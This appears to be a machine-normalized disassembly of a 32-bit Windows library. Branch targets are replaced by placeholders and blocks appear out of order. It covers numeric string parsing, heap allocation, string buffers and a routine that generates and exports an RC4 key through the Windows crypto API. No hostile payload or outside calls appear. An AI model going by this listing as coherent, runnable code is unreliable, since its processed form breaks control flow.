cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push edi
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10005b50
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
cmp [ esi + 0x5 ] 0x65
je r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
push [ ebp - 0x60 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005f5ef
push edi
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx 0x24
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
push edi
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x45
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
push edi
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001f91c
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push edi
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001f91c
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x52 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
push edi
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005f5ef
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001f91c
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x60 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f5ef
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001f91c
sub_10020e20
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
lea edi [ ebp - 0x50 ]
push edi
xor ebx ebx
mov esi edx
mov [ ebp - 0x50 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
mov [ ebp - 0x60 ] ebx
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x5c ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x70
call sub_1002f620
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x60 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x120
call sub_1002f620
lea edx [ ebp - 0x58 ]
mov [ ebp - 0x58 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x58 ]
push ecx
call sub_10004b50
mov edx [ ebp - 0x58 ]
push edx
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xee
call sub_1002f620
mov [ ebp - 0x60 ] 0x3
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
sub_10020f50
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_1006d490
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10020f90
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10007870
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10020fb2
push ebp
mov ebp esp
push 0x8
push 0x1
push r--data
push 0x0
push [ ebp + 0x8 ]
call [ CryptAcquireContextW@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffe
add eax 0x2
pop ebp
retn 0x4
sub_10020fd7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_10021030
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10021090
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_10048fd4
pop ecx
call sub_1005b670
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_10032438
push 0x1e
call sub_10053809
push 0xff
call sub_10067a82
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1005b670
mov [ eax ] esi
push ebx
call sub_10048fd4
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1005b670
mov [ eax ] esi
sub_10021130
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_10030594
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_10045c60
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0xc ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx edx [ ebp + 0xc ]
push edi
push edx
push eax
call sub_1007f8f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100211ee
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_1007fa40
pop ecx
mov edi eax
jmp r-xdata
call sub_1005b4dc
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_1007fa40
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_10005412
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_10021275
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000fcc7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10021296
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10013b6a
add esp 0x14
pop ebp
retn 0x10
sub_100212b7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_100651be
test ebx ebx
je r-xdata
push r--data
call sub_10030594
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_100056ae
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007ec40
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_100412aa
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10021370
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_1007ec40
add esp 0xc
pop ebp
retn
sub_10021390
push ebp
mov ebp esp
push 0xffffffff
push sub_100861eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_1004f410
mov [ esi ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_1003f6d0
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
sub_10021420
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x12c ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x34 ]
mov eax 0xcb
call sub_1002f620
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10043c70
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_1002148a
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x800003
push 0x6801
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
xor eax eax
inc eax
lea eax [ ebp - 0x8 ]
push eax
call sub_10020fb2
jmp r-xdata
push [ ebx ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x8
xor eax eax
inc eax
cmp eax edi
je r-xdata
push ebx
push eax
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_1002157b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_1005b670
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_1001fcf4
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_100490fd
add esp 0x24
leave
retn
sub_100215e0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x3f
add eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
div [ ecx + 0x108 ]
pop edi
pop esi
pop ebx
mov eax edx
mov esp ebp
pop ebp
retn 0x8
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0xc ]
sub_10021694
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_100579de
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_10082444
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_10046c41
push edi
call sub_1001b2d2
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_10021720
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebx + ebx + 0x2 ]
mov [ ebp - 0x4 ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov edx [ ebp + 0xc ]
mov eax [ edx ]
pop esi
mov [ edi + ebx * 4 ] eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp esi eax
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
pop esi
mov [ edi + ebx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp - 0x4 ] ebx
jl r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
pop esi
mov [ edi + ebx * 4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_100217e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_1002181c
push 0x38
mov eax sub_100857c1
call sub_10047689
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006406d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002be90
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100262c3
retn 0x20
sub_100218e0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xcf
call sub_1002f620
mov eax edi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x9a
call sub_1002f620
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
push ecx
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x10a
call sub_1002f620
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push ebx
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xbf
call sub_1002f620
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
